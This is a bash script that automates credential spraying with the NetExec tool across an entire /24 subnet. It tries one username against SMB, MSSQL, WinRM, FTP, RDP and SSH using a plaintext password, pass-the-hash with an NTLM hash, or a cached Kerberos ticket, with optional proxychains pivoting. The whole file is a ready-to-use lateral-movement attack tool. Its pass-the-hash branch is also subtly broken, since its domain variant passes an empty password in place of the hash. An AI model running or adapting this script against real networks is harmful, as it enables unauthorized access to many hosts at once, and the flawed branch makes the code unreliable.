#!/usr/bin/env bash

# Initialize variables
ip=""
user=""
password=""
hash=""
domain=""
KERBEROS=""
IGNORE_SERVICES=""

usage() {
    echo -e "Usage: $0 -i [ip] -u [user] (-p <password> | -H <hash> | -k) -d <domain> [-P]\n"
    echo "Flags:"
    echo -e "\t-p: password authentication"
    echo -e "\t-H: pass-the-hash authentication (NTLM hash)"
    echo -e "\t-k: Kerberos authentication (uses current TGT from ccache)"
    echo -e "\t-d: domain to authenticate against (only used with password/hash based authenticataion)"
    echo -e "\t-P: enable proxychains4"
    echo -e "\t-x: comma-separated list of services to ignore (e.g. ftp,rdp)"
    echo -e "\n\t-p, -H, and -k are mutually exclusive"
    exit 1
}

run_cmd() {
    echo "[*] $@"
    $@
    echo -e "[+] Done\n"
}

is_ignored() {
    local svc="$1"
    IFS=',' read -ra ignores <<< "$IGNORE_SERVICES"
    for i in "${ignores[@]}"; do
        [[ "$svc" == "$i" ]] && return 0
    done
    return 1
}

# Parse arguments using getopts
while getopts i:u:p:H:d:Phkx: flag
do
    case "${flag}" in
        i) ip=${OPTARG}
        ;;
        u) user=${OPTARG}
        ;;
        p) password=${OPTARG}
        ;;
        H) hash=${OPTARG}
        ;;
        d) domain=${OPTARG}
        ;;
        P) PROXYCHAINS="true"
        ;;
        k) KERBEROS="true"
        ;;
        x) IGNORE_SERVICES=${OPTARG}
        ;;
        h)
            usage
        ;;
        *)
            usage
        ;;
    esac
done

if [[ -z $ip || -z $user ]]; then
    usage
fi

auth_count=0
[[ -n "$password" ]] && ((auth_count++))
[[ -n "$hash" ]] && ((auth_count++))
[[ "$KERBEROS" == "true" ]] && ((auth_count++))

if [[ $auth_count -gt 1 ]]; then
    echo "[-] Error: -p, -H, and -k are mutually exclusive"
    usage
fi

NXC=""
if [[ "$PROXYCHAINS" == "true" ]]; then
    nxc=$(which nxc)
    NXC="sudo proxychains4 ${nxc}"
else
    NXC=$(which nxc)
fi

iprange="${ip}/24"

if [[ -n "$password" ]]; then
    for proto in smb mssql winrm ftp rdp ssh; do
        is_ignored "$proto" && continue
        run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success"
        run_cmd "${NXC} $proto $iprange -u $user -p $password --continue-on-success --local-auth"
        if [[ -n "$domain" ]]; then
            run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -p $password --continue-on-success"
        fi
    done
    exit 0
fi

if [[ -n "$hash" ]]; then
    for proto in smb mssql rdp winrm ftp; do
        is_ignored "$proto" && continue
        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success"
        run_cmd "${NXC} $proto $iprange -u $user -H aad3b435b51404eeaad3b435b51404ee:$hash --continue-on-success --local-auth"
        if [[ -n "$domain" ]]; then
            run_cmd "${NXC} $proto $iprange -u ${domain}\\${user} -p $password --continue-on-success"
        fi
    done
    exit 0
fi

if [[ "$KERBEROS" == "true" ]]; then
    for proto in smb mssql rdp winrm ssh ftp; do
        is_ignored "$proto" && continue
        run_cmd "${NXC} $proto $iprange -u $user -k --use-kcache --continue-on-success"
    done
    exit 0
fi